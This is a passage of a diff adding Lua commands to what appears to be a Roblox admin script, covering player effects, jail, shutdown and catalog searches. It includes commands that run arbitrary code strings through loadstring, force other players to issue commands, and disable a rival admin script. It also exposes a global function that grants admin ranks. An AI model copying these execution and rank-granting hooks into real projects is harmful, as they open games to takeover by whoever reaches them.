+	Root.Explore(Player, game:service(Arguments[1]))
+end
+)
+Root.AddCommand(
+'Globals Explore',
+4,
+{
+	'gexplore'
+},
+function(Player, Arguments)
+Root.TableExplore(Player, _G,'Globals',nil)
+end
+)
+Root.AddCommand(
+'UnForceField',
+3,
+{
+	'unff'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			InvisFFs[v.Name] = false
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'ForceField' then
+					p:Destroy()
+					p = nil
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Local Execute',
+3,
+{
+	'lexe'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		thread(function()
+			local ls=Root.Children['LEXE']:clone()
+			ls.Value=Root.Join(Arguments)
+			ls.Parent=v.Character
+			wait()
+			ls.exe.Disabled=false
+			table.insert(Objects,ls)
+		end)
+	end
+end
+)
+Root.AddCommand(
+	'Execute',
+	4,
+	{
+	'exe', -- i got carried away with usages
+	's',
+	'script',
+	'execute',
+	'exec',
+	'source',
+	'src'
+},
+	function(Player, Arguments)
+	coroutine.resume(coroutine.create(function()
+		local ls = script["loadstring"]:Clone()
+		ls.Parent = workspace
+		table.insert(Objects, ls)
+		wait()
+		ls.Disabled = false
+		local ev = ls:children()[1]
+		local tofire = {}
+		tofire.print = {}
+		setmetatable(tofire.print, {
+			__metatable = 'This metatable is locked.';
+			__call = function(a, txt, ...)
+				txt = tostring(txt)
+				Root.Ping(Player, '[EXE Output]: '..txt, 'Lime green')
+				if (...) then
+					tofire.print(...)
+				end
+			end;
+		})
+		tofire.warn = {}
+		setmetatable(tofire.warn, {
+			__metatable = 'This metatable is locked.';
+			__call = function(a, txt, ...)
+				txt = tostring(txt)
+				Root.Ping(Player, '[EXE Warning]: '..txt, 'Deep orange')
+				if (...) then
+					tofire.warn(...)
+				end
+			end;
+		})
+		tofire.error = {}
+		setmetatable(tofire.error, {
+			__metatable = 'This metatable is locked.';
+			__call = function(a, txt, ...)
+				txt = tostring(txt)
+				Root.Ping(Player, '[EXE Error]: '..txt..'.', 'Really red')
+				if (...) then
+					tofire.error(...)
+				end
+			end;
+		})
+		local code = math.random()
+		_G['print'..code] = tofire.print
+		ev:Fire('print', 'print'..code)
+		_G['warn'..code] = tofire.warn
+		ev:Fire('warn', 'warn'..code)
+		_G['error'..code] = tofire.error
+		ev:Fire('error', 'error'..code)
+		ev:Fire('ls', Root.Join(Arguments))
+	end))
+end
+)
+Root.AddCommand(
+	'Keybind',
+	1,
+	{
+	'kb',
+	'bind',
+	'keybind'
+},
+	function(Player, Arguments)
+	local t = Arguments[1]
+	table.remove(Arguments, 1)
+	Root.FireClient(Player, 'SetKeyBind', t, Root.Join(Arguments))
+end
+)
+Root.AddCommand(
+	'Swordbind',
+	1,
+	{
+	'bindsword',
+	'swordbind',
+},
+	function(Player, Arguments)
+	local sw = Root.Children['BindSword']:clone()
+	sw.Parent = Player.Backpack
+	sw.Name = Root.Join(Arguments)
+end
+)
+Root.AddCommand(
+'Nil',
+3,
+{
+	'nil'
+},
+function(Player, Arguments)
+	if #Arguments < 1 then
+		return
+	end
+	for i, Player1 in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if Root.GetRank(Player) > Root.GetRank(Player1) or Player1.Name == Player.Name then
+			Player1.Character = nil
+			wait()
+			Root.FireClient(Player1, 'Nil')
+			wait()
+			Player1:Destroy()
+		end
+	end
+end
+)
+Root.AddCommand(
+	'Dismiss',
+	0,
+	{
+	'dt',
+	'dismiss'
+},
+	function(Player, Arguments)
+	Root.FireClient(Player, 'Dismiss')
+end
+)
+Root.AddCommand(
+	'Shutdown',
+	3,
+	{
+	'sd',
+	'shutdown'
+},
+	function(Player, Arguments)
+	while wait() do
+		for i, v in pairs(Root.GetRawPlayers()) do
+			thread(function()
+				--Root.FireClient(v, 'Teleport', game.PlaceId, nil, 1)
+				wait()
+				Root.Kick(v, 'Server shutdown.')
+			end)
+		end
+	end
+end
+)
+Root.AddCommand(
+'Size',
+1,
+{
+	'size'
+},
+function(Player, Arguments)
+	if (tonumber(Arguments[2]) or 0) > 5000 or (tonumber(Arguments[2]) or 0) < 1 then
+		Root.Ping(Player, 'Sizes cannot be more than 5000 or less than 1!', 'Really red')
+		return
+	end
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		fatsize(v, Arguments[2])
+	end
+end)
+Root.AddCommand(
+'Giant',
+1,
+{
+	'giant';
+	'thicc';
+	'fat';
+	'huge'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		fatsize(v, 500)
+	end
+end)
+Root.AddCommand(
+'Grip Pos',
+1,
+{
+	'grippos'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Tool' then
+					p.GripPos = Vector3.new(tonumber(Arguments[2]), tonumber(Arguments[3]), tonumber(Arguments[4]))
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Countdown',
+1,
+{
+	'cd',
+	'count',
+	'countdown'
+},
+function(Player, Arguments)
+	for i = 1, tonumber(Arguments[1]) + 1 do
+		for o, v in pairs(game:service'Players':GetPlayers()) do
+			pcall(function()
+				Root.FireClient(v, 'HintGui', '[Count-Down]: '..tonumber(Arguments[1]) + 1 - i, 1)
+			end)
+		end
+		wait(1)
+	end
+end
+)
+Root.AddCommand(
+'Jail',
+1,
+{
+	'jail'
+},
+function(Player, Arguments)
+	local Names = {}
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		Names[v.Name] = true
+	end
+	for i, v in pairs(Jails) do
+		if Names[v.Player] then
+			v.Jail:Destroy()
+		end
+	end
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		spawn(function()
+			Root.Jail(v)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'SkyCell',
+1,
+{
+	'skycell'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		SkyCell[v.userId] = true
+	end
+end
+)
+Root.AddCommand(
+'UnSkyCell',
+1,
+{
+	'unskycell'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if SkyCell[v.userId] then
+		SkyCell[v.userId] = false
+		v:LoadCharacter()
+		end
+	end
+end
+)
+Root.AddCommand(
+'Sudo',
+4,
+{
+	'sudo'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			Root.AddLog(Player.Name.." sudo'd "..v.Name..' the following: '..Root.Join(Arguments))
+			Root.PlayerChatted(v, Root.Join(Arguments),true)
+		end
+	end
+end
+)
+Root.AddCommand(
+'Body Swap',
+1,
+{
+	'bodyswap';
+},
+function(Player, Arguments)
+	player = Root.GetPlayers(Player, Arguments[1])[1]
+	player2 = Root.GetPlayers(Player, Arguments[2])[1]
+	local c = player.Character:children()
+	local c2 = player2.Character:children()
+	player.Character.Humanoid:Destroy()
+	player2.Character.Humanoid:Destroy()
+	for i, v in pairs(c) do
+		if not v:IsA'Humanoid' and not v:IsA"Accoutrement" then
+			v.Parent = player2.Character
+		elseif v:IsA"Accoutrement" then
+			v.Parent = nil
+		end
+	end
+	for i, v in pairs(c2) do
+		if not v:IsA'Humanoid' and not v:IsA"Accoutrement" then
+			v.Parent = player.Character
+		elseif v:IsA"Accoutrement" then
+			v.Parent = nil
+		end
+	end
+	wait()
+	local h = Instance.new('Humanoid', player.Character)
+	h.Died:connect(function()
+		wait(3)
+		player:LoadCharacter()
+	end)
+	local h2 = Instance.new('Humanoid', player2.Character)
+	h2.Died:connect(function()
+		wait(3)
+		player2:LoadCharacter()
+	end)
+	wait()
+	for i, v in pairs(c) do
+		if v:IsA"Accoutrement" then
+			v.Parent = player2.Character
+		end
+	end
+	for i, v in pairs(c2) do
+		if v:IsA"Accoutrement" then
+			v.Parent = player.Character
+		end
+	end
+end
+)
+Root.AddCommand(
+'Possess',
+1,
+{
+	'possess';
+	'control'
+},
+function(Player, Arguments)
+	local p = Root.GetPlayers(Player, Arguments[1])[1]
+	Player.Character:ClearAllChildren()
+	for i, v in pairs(p.Character:children()) do
+		v.Parent = Player.Character
+	end
+	wait()
+	Root.Commands.nrs.Function(Player, {
+		'me,-others'
+	})
+	wait()
+	Root.FireClient(p, 'SetView', Player.Character.Humanoid)
+	Root.Commands.name.Function(Player, {
+		'me,-others',
+		p.Name
+	})
+	Player.Character.Humanoid.Died:connect(function()
+		thread(function()
+			wait(3)
+			Player:LoadCharacter()
+		end)
+		thread(function()
+			wait(3)
+			p:LoadCharacter()
+		end)
+	end)
+end
+)
+Root.AddCommand(
+'Un-Jail',
+1,
+{
+	'unjail'
+},
+function(Player, Arguments)
+	local Names = {}
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		Names[v.Name] = true
+	end
+	for i, v in pairs(Jails) do
+		if Names[v.Player] then
+			v.Jail:Destroy()
+		end
+	end
+end
+)
+Root.AddCommand(
+'Sit',
+1,
+{
+	'sit',
+},
+function(Player, Arguments)
+	for index, player in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if player and player.Character and player.Character.Humanoid then
+			player.Character.Humanoid.Sit = true
+		end
+	end
+end
+)
+Root.AddCommand(
+'Age',
+1,
+{
+	'age'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			Root.Ping(Player, v.Name.."'s Account is  "..v.AccountAge..' days old.')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Self',
+0,
+{
+	'self'
+},
+function(Player, Arguments)
+	Root.FireClient(Player, 'Dismiss')
+	Root.Ping(Player, 'You are '..Root.RankName(Player))
+	Root.Ping(Player, Player.Name)
+	Root.Ping(Player, Root.Prefix..' is the prefix')
+	Root.Ping(Player, game.PlaceId..' is the place-id')
+end
+)
+enableCmdOrbs = false
+Root.AddCommand(
+'Toggle Command Orbs (cmdorbs)',
+1,
+{
+	'cmdorbs'
+},
+function(Player, Arguments)
+	enableCmdOrbs = not enableCmdOrbs
+	Root.Ping(Player, 'Orb command list: '..tostring(enableCmdOrbs))
+end
+)
+Root.AddCommand(
+'Commands',
+0,
+{
+	'cmds'
+},
+function(Player, Arguments,Page)
+if enableCmdOrbs then
+	Page=Page or 1
+	Root.FireClient(Player, 'Dismiss')
+	local Cmds={}
+	local Aliases={}
+	local Done={}
+	for i, v in pairs(Root.Commands) do
+		Aliases[i]=v.Name
+		if not Done[v.Name] and Root.GetRank(Player) >= v.Rank then
+			Done[v.Name] = true
+			table.insert(Cmds, v)
+		end
+end
+local maxp=math.ceil(#Cmds/12)
+if Page~=1 then
+Root.Ping(Player,'Previous Page','Lime green',function()
+Root.Commands.cmds.Function(Player,Arguments,Page-1)
+end)
+end
+Root.Ping(Player,'Page '..Page..'/'..maxp,'New Yeller')
+if Page~=maxp then
+Root.Ping(Player,'Next Page','Lime green',function()
+Root.Commands.cmds.Function(Player,Arguments,Page+1)
+end)
+end
+for i=1, 12 do
+local v=Cmds[i+(12*(Page-1))]
+if v then
+
+Root.Ping(Player,v.Name,nil,function()
+Root.FireClient(Player, 'Dismiss')
+Root.Ping(Player,'Back','Really blue',function()
+Root.Commands.cmds.Function(Player,Arguments,Page)
+end)
+Root.Ping(Player,'Name | '..v.Name)
+Root.Ping(Player,'Level | '..Root.RankName(v.Rank))
+Root.Ping(Player,'Aliases',nil,function()
+Root.FireClient(Player, 'Dismiss')
+Root.Ping(Player,'Back','Really blue',function()
+Root.Commands.cmds.Function(Player,Arguments,Page)
+end)
+for o,p in pairs(Aliases) do
+if p==v.Name then
+Root.Ping(Player,o)
+end
+
+
+end
+
+
+end)
+
+
+end)
+
+end
+end
+
+end
+if not enableCmdOrbs then
+		local Cmds={}
+	local Aliases={}
+	local Done={}
+	local list = {}
+		for i, v in pairs(Root.Commands) do
+		Aliases[i]=v.Name
+		if not Done[v.Name] and Root.GetRank(Player) >= v.Rank then
+			Done[v.Name] = true
+			table.insert(Cmds, v)
+		end
+		end
+		for i,v in pairs(Cmds) do
+			local fat = ''
+			for o,p in pairs(Aliases) do
+				if p == v.Name then
+					if fat == '' then
+						fat = o
+					else
+						fat = fat..', '..o
+					end
+				end
+			end
+			table.insert(list, 'Name: '..v.Name..' | Rank : '..v.Rank..', '..Root.RankName(v.Rank)..' | AKA: '..fat)
+		end
+	Root.FireClient(Player, 'ScrollGui', 'Commands', list)
+end
+end
+)
+Root.AddCommand(
+'Message of the day',
+0,
+{
+	'motd'
+},
+function(Player, Arguments)
+Root.Ping(Player,Root.Motd,'Deep orange')
+end
+)
+Root.AddCommand(
+'Scripts',
+2,
+{
+	'scripts'
+},
+function(Player, Arguments)
+	local Txts = {}
+	for i, v in pairs(Root.Children['Scripts']:children()) do
+		table.insert(Txts, v.Name)
+	end
+	Root.FireClient(Player, 'ScrollGui', 'Scripts', Txts)
+end
+)
+Root.AddCommand(
+'Inject',
+2,
+{
+	'inject'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	Tools = {}
+	for i, v in pairs(Root.Children['Scripts']:children()) do
+		if (v:IsA'Tool' or v:IsA'HopperBin' or v:IsA'LocalScript') and (v.Name:lower():sub(1, #Root.Join(Arguments)) == Root.Join(Arguments):lower() or Root.Join(Arguments):lower() == 'all') then
+			table.insert(Tools, v)
+		end
+	end
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			for o, p in pairs(Tools) do
+				local c=p:clone()
+				if c:IsA'LocalScript' then
+				c.Disabled=true
+				end
+				c.Parent = v.Backpack
+				if c:IsA'LocalScript' then
+				wait()
+				c.Disabled=false
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Search Gear',
+2,
+{
+	'searchgear',
+	'sg'
+},
+function(Player, Arguments, Page)
+	Page = Page or 1
+	local tosearch = Root.Join(Arguments)
+	local songs = game:service'HttpService':JSONDecode(game:service'HttpService':GetAsync('http://rproxy.pw/catalog/json?CatalogContext=1&SortType=0&SortAggregation=3&SortCurrency=0&LegendExpanded=true&Category=5&ResultsPerPage=10&IncludeNotForSale=true&PageNumber='..tostring(Page)..'&Keyword='..game:service'HttpService':UrlEncode(tosearch)))
+	Root.FireClient(Player, 'Dismiss')
+	local customs = {
+		['Epic Katana'] = 246270069;
+		['Fireball'] = 31518609;
+		['Paintball gun'] = 47532;
+		['Sword'] = 47433;
+		['Superball'] = 47613;
+		['ThorHammer'] = 93652837;
+		['Delete'] = 135540706;
+	}
+	if string.find(tosearch:lower(), '_custom') and Page == 1 then
+		for i, v in pairs(customs) do
+			table.insert(songs, {
+				Name = i;
+				Creator = 'DarthStrantax';
+				AssetId = v
+			})
+		end
+	end
+	if Page ~= 1 then
+		Root.Ping(Player, 'Previous Page', 'Lime green', function()
+			Root.Commands.sg.Function(Player, Arguments, Page - 1)
+		end)
+	end
+	Root.Ping(Player, 'Next Page', 'Lime green', function()
+		Root.Commands.sg.Function(Player, Arguments, Page + 1)
+	end)
+	Root.Ping(Player, 'Close', 'Really red', function()
+		Root.FireClient(Player, 'Dismiss')
+	end)
+	for i, v in pairs(songs) do
+		Root.Ping(Player, v.Name, nil, function()
+			Root.FireClient(Player, 'Dismiss')
+			Root.Ping(Player, 'Close', 'Really red', function()
+				Root.FireClient(Player, 'Dismiss')
+			end)
+			Root.Ping(Player, 'Back', 'Really blue', function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Commands.sg.Function(Player, Arguments, Page)
+			end)
+			Root.Ping(Player, 'Name | '..v.Name)
+			Root.Ping(Player, 'Id | '..v.AssetId)
+			Root.Ping(Player, 'Creator | '..v.Creator)
+			Root.Ping(Player, 'Insert Gear', nil, function()
+				Root.Commands.gear.Function(Player, {
+					'me,-others',
+					tostring(v.AssetId),
+				})
+			end)
+			if v.IsForSale or v.IsPublicDomain then
+				Root.Ping(Player, 'Buy', function()
+					game:service'MarketplaceService':PromptPurchase(Player, v.AssetId)
+				end)
+			else
+				Root.Ping(Player, 'Not for sale.')
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Unsparkles',
+1,
+{
+	'unsparks',
+	'unsparkles'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments)) do
+		if v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+			for l, p in pairs(v.Character.HumanoidRootPart:GetChildren()) do
+				if p:FindFirstChild("Sparkles") then
+					p:remove()
+				end
+			end
+		end
+	end
+end
+)
+Root.AddCommand(
+'Unfire',
+1,
+{
+	"unfire",
+	"unflames"
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments)) do
+		if v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+			for l, p in pairs(v.Character.HumanoidRootPart:GetChildren()) do
+				if p:IsA("Fire") then
+					p:remove()
+				end
+			end
+		end
+	end
+end
+)
+Root.AddCommand(
+'Fire',
+1,
+{
+	'fire',
+	'flames'
+},
+function(Player, Arguments)
+	local Arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	local Fcolor = BrickColor.new(Root.Join(Arguments) or 'Really red').Color
+	for i, v in pairs(Root.GetPlayers(Player, Arg1)) do
+		thread(function()
+			if v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+				local fire = Instance.new("Fire", v.Character.HumanoidRootPart)
+				fire.Color = Fcolor
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Sparkles',
+1,
+{
+	'sparkles',
+	'sparks'
+},
+function(Player, Arguments)
+	local Arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	local Lcolor = BrickColor.new(Root.Join(Arguments) or 'Really red').Color
+	for i, v in pairs(Root.GetPlayers(Player, Arg1)) do
+		thread(function()
+			if v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+				local sparks = Instance.new("Sparkles", v.Character.HumanoidRootPart)
+				sparks.SparkleColor = Lcolor
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'[Donator] Search Hat',
+0,
+{
+	'!hat'
+},
+function(Player, Arguments, Page)
+	if not game:service'MarketplaceService':PlayerOwnsAsset(Player,324943527) and not Root.FreeDonor[Player.Name] then
+	--game:service'MarketplaceService':PromptPurchase(Player,324943527)
+	return
+	end
+	Page = Page or 1
+	local tosearch = Root.Join(Arguments)
+	local songs = game:service'HttpService':JSONDecode(game:service'HttpService':GetAsync('http://rproxy.pw/catalog/json?CatalogContext=1&SortType=0&SortAggregation=3&SortCurrency=0&LegendExpanded=true&Category=3&Subcategory=9&ResultsPerPage=10&IncludeNotForSale=true&PageNumber='..tostring(Page)..'&Keyword='..game:service'HttpService':UrlEncode(tosearch)))
+	Root.FireClient(Player, 'Dismiss')
+	if Page ~= 1 then
+		Root.Ping(Player, 'Previous Page', 'Lime green', function()
+			Root.Commands['!hat'].Function(Player, Arguments, Page - 1)
+		end)
+	end
+	Root.Ping(Player, 'Next Page', 'Lime green', function()
+		Root.Commands['!hat'].Function(Player, Arguments, Page + 1)
+	end)
+	Root.Ping(Player, 'Close', 'Really red', function()
+		Root.FireClient(Player, 'Dismiss')
+	end)
+	for i, v in pairs(songs) do
+		Root.Ping(Player, v.Name, nil, function()
+			Root.FireClient(Player, 'Dismiss')
+			Root.Ping(Player, 'Close', 'Really red', function()
+				Root.FireClient(Player, 'Dismiss')
+			end)
+			Root.Ping(Player, 'Back', 'Really blue', function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Commands.sh.Function(Player, Arguments, Page)
+			end)
+			Root.Ping(Player, 'Name | '..v.Name)
+			Root.Ping(Player, 'Id | '..v.AssetId)
+			Root.Ping(Player, 'Creator | '..v.Creator)
+			Root.Ping(Player, 'Insert Hat', nil, function(Player)
+				local c=game:service'InsertService':LoadAsset(v.AssetId):children()[1]
+				local b=Instance.new('StringValue',c)
+				b.Name='LibertyADonorHatFlag'
+				c.Parent=Player.Character
+				local d=Player.Character.ChildAdded:connect(function(object)
+					if object:FindFirstChild'LibertyADonorHatFlag' and object~=c then
+						c:Destroy()
+						d:disconnect()
+						end
+					
+					
+					end)
+			end)
+			if v.IsForSale or v.IsPublicDomain then
+				Root.Ping(Player, 'Buy', function()
+					game:service'MarketplaceService':PromptPurchase(Player, v.AssetId)
+				end)
+			else
+				Root.Ping(Player, 'Not for sale.')
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Search Hat',
+2,
+{
+	'searchhat',
+	'searchh'
+},
+function(Player, Arguments, Page)
+	Page = Page or 1
+	local tosearch = Root.Join(Arguments)
+	local songs = game:service'HttpService':JSONDecode(game:service'HttpService':GetAsync('http://rproxy.pw/catalog/json?CatalogContext=1&SortType=0&SortAggregation=3&SortCurrency=0&LegendExpanded=true&Category=3&Subcategory=9&ResultsPerPage=10&IncludeNotForSale=true&PageNumber='..tostring(Page)..'&Keyword='..game:service'HttpService':UrlEncode(tosearch)))
+	Root.FireClient(Player, 'Dismiss')
+	if Page ~= 1 then
+		Root.Ping(Player, 'Previous Page', 'Lime green', function()
+			Root.Commands.sh.Function(Player, Arguments, Page - 1)
+		end)
+	end
+	Root.Ping(Player, 'Next Page', 'Lime green', function()
+		Root.Commands.sh.Function(Player, Arguments, Page + 1)
+	end)
+	Root.Ping(Player, 'Close', 'Really red', function()
+		Root.FireClient(Player, 'Dismiss')
+	end)
+	for i, v in pairs(songs) do
+		Root.Ping(Player, v.Name, nil, function()
+			Root.FireClient(Player, 'Dismiss')
+			Root.Ping(Player, 'Close', 'Really red', function()
+				Root.FireClient(Player, 'Dismiss')
+			end)
+			Root.Ping(Player, 'Back', 'Really blue', function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Commands.sh.Function(Player, Arguments, Page)
+			end)
+			Root.Ping(Player, 'Name | '..v.Name)
+			Root.Ping(Player, 'Id | '..v.AssetId)
+			Root.Ping(Player, 'Creator | '..v.Creator)
+			Root.Ping(Player, 'Insert Hat', nil, function()
+				Root.Commands.hat.Function(Player, {
+					'me,-others',
+					tostring(v.AssetId),
+				})
+			end)
+			if v.IsForSale or v.IsPublicDomain then
+				Root.Ping(Player, 'Buy', function()
+					game:service'MarketplaceService':PromptPurchase(Player, v.AssetId)
+				end)
+			else
+				Root.Ping(Player, 'Not for sale.')
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'SearchMusic',
+0,
+{
+	'searchmusic',
+	'searchm'
+},
+function(Player, Arguments, Page)
+	Page = Page or 1
+	local tosearch = Root.Join(Arguments)
+	local songs = game:service'HttpService':JSONDecode(game:service'HttpService':GetAsync('http://rproxy.pw/catalog/json?CatalogContext=2&SortType=0&SortAggregation=3&SortCurrency=0&LegendExpanded=true&Category=9&ResultsPerPage=10&IncludeNotForSale=true&PageNumber='..tostring(Page)..'&Keyword='..game:service'HttpService':UrlEncode(tosearch)))
+	Root.FireClient(Player, 'Dismiss')
+	if Page ~= 1 then
+		Root.Ping(Player, 'Previous Page', 'Lime green', function()
+			Root.Commands.sm.Function(Player, Arguments, Page - 1)
+		end)
+	end
+	Root.Ping(Player, 'Next Page', 'Lime green', function()
+		Root.Commands.sm.Function(Player, Arguments, Page + 1)
+	end)
+	Root.Ping(Player, 'Close', 'Really red', function()
+		Root.FireClient(Player, 'Dismiss')
+	end)
+	for i, v in pairs(songs) do
+		Root.Ping(Player, v.Name, nil, function()
+			Root.FireClient(Player, 'Dismiss')
+			Root.Ping(Player, 'Close', 'Really red', function()
+				Root.FireClient(Player, 'Dismiss')
+			end)
+			Root.Ping(Player, 'Back', 'Really blue', function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Commands.sm.Function(Player, Arguments, Page)
+			end)
+			Root.Ping(Player, 'Name | '..v.Name)
+			Root.Ping(Player, 'Id | '..v.AssetId)
+			Root.Ping(Player, 'Creator | '..v.Creator)
+			Root.Ping(Player, 'Play', nil, function()
+				Root.Commands.music.Function(Player, {
+					tostring(v.AssetId)
+				})
+			end)
+			if Root.GetRank(Player) >= 2 then
+				Root.Ping(Player, 'Play on server', nil, function()
+					Root.Commands.music.Function(Player, {
+						tostring(v.AssetId),
+						'srv',
+						'true'
+					})
+				end)
+			end
+			if v.IsForSale or v.IsPublicDomain then
+				Root.Ping(Player, 'Buy', function()
+					game:service'MarketplaceService':PromptPurchase(Player, v.AssetId)
+				end)
+			else
+				Root.Ping(Player, 'Not for sale.')
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+"Hat",
+2,
+{
+	"hat"
+},
+function(Player, Arguments)
+	local sword = game:service'InsertService':LoadAsset(tonumber(Arguments[2])):children()[1]
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		sword:clone().Parent = v.Character
+	end
+end
+)
+Root.AddCommand(
+'Gear',
+2,
+{
+	'gear'
+},
+function(Player, Arguments)
+	local sword = game:service'InsertService':LoadAsset(tonumber(Arguments[2])):children()[1]
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		sword:clone().Parent = v.Backpack
+		if Arguments[3] and Arguments[3] == 'true' then
+			sword:clone().Parent = v.StarterGear
+		end
+	end
+end
+)
+Root.AddCommand(
+'Pitch',
+1,
+{
+	'pitch'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:GetService'InsertService':children()) do
+		if v:IsA'Sound' then
+			v.Pitch = tonumber(Arguments[1])
+		end
+	end
+end)
+Root.AddCommand(
+'Plugins',
+4,
+{
+	'plugins'
+},
+function(Player, Arguments)
+	for i, v in pairs(Plugins) do
+		if not v.Installed then
+			Root.Ping(Player, v.Name, 'Toothpaste', function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Ping(Player, v.Name)
+				Root.Ping(Player, 'Install Plugin', nil, function()
+					v.Func(getfenv(), Player)
+					v['Installed'] = true
+				end)
+				Root.Ping(Player, 'Created by '..v.Creator)
+				Root.Ping(Player, v.Desc)
+			end)
+		end
+	end
+end
+)
+Root.AddCommand(
+'AddPlugin',
+4,
+{
+	'addplugin'
+},
+function(Player, Arguments)
+	if AllowedInstallPlugins[tonumber(Arguments[1])] then
+		Plugins[require(tonumber(Arguments[1])).Name] = require(tonumber(Arguments[1]))
+	end
+end
+)
+Root.AddCommand(
+'Remove Kohls',
+2,
+{
+	'rk'
+},
+function(Player, Arguments)
+	local kohls = getfenv(_G.Message)
+	if Arguments[1] == 'reverse' then
+		kohls.script.Disabled = false
+	else
+		kohls.script.Disabled = true
+	end
+	for i, v in pairs(game:service'StarterGui':children()) do
+		if v.Name == 'AdminGui' then
+			v:Destroy()
+		end
+	end
+end
+)
+Root.AddCommand(
+'Music',
+2,
+{
+	'music'
+},
+function(Player, Arguments)
+	local Id
+	local Srv = true
+	if Arguments[1] then
+		Id = Arguments[1]
+	else
+		return
+	end
+	if Srv then
+		for i, v in pairs(workspace:children()) do
+			if v:IsA'Sound' then
+				thread(function()
+					v:Pause()
+					v:Destroy()
+				end)
+			end
+		end
+		for i, v in pairs(game:GetService'InsertService':children()) do
+			if v:IsA'Sound' then
+				thread(function()
+					v:Pause()
+					v:Destroy()
+				end)
+			end
+		end
+		local music = Instance.new('Sound')
+		table.insert(Objects,music)
+		music.Parent = game:GetService'InsertService'
+		music.Looped = true
+		music.Volume = Arguments[2] or 1
+		--music.Looped = tobool(Arguments[3]) or false
+		music.Pitch = 1
+		music.SoundId = "http://www.roblox.com/asset/?id="..Id
+		music:Play()
+	else
+		Root.FireClient(Player, 'PlayMusic', Id, tobool(Arguments[2]) or false)
+	end
+end
+)
+Root.AddCommand(
+'Avenge',
+2,
+{
+	'avenge'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			v.Character.Humanoid.ChildAdded:connect(function(v)
+				if v.Name == 'creator' then
+					v.Value.Character:BreakJoints()
+				end
+			end)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Death Avenge',
+2,
+{
+	'deathavenge'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			v.Character.Humanoid.Died:connect(function()
+				if v.Character.Humanoid:FindFirstChild'creator' then
+					v.Character.Humanoid:FindFirstChild'creator'.Value.Character:BreakJoints()
+				end
+			end)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Invert',
+1,
+{
+	'invert',
+	'inv',
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		-- okay, we're going to turn the player into an abomination.
+		local Character = v.Character
+		if not v.Character then
+			return
+		end
+		local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
+		if not HumanoidRootPart then
+			return
+		end
+		local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = HumanoidRootPart.CFrame:components()
+		HumanoidRootPart.CFrame = CFrame.new(x, y, z, -R00, -R01, -R02, -R10, -R11, -R12, -R20, -R21, -R22) * CFrame.Angles(math.rad(180), 0, 0)
+	end
+end
+)
+local LibertyAGlobals = {
+	['AddAdmin'] = function(Id, Rank)
+		Root.Ranks[Id] = Rank
+	end;
+	['Set'] = function(i, v)
+		if i=='Ranks' then return end
+		Root[i] = v
+	end;
+	['Chatted'] = function(a, b)
+		if game.IsA(a, 'Player') and a.userId ~= (0x1044832) then
+			Root.PlayerChatted(a, b)
+		end
+	end;
+	['Kick'] = Root.Kick;
+	['Ping'] = function(a,b,c,...)
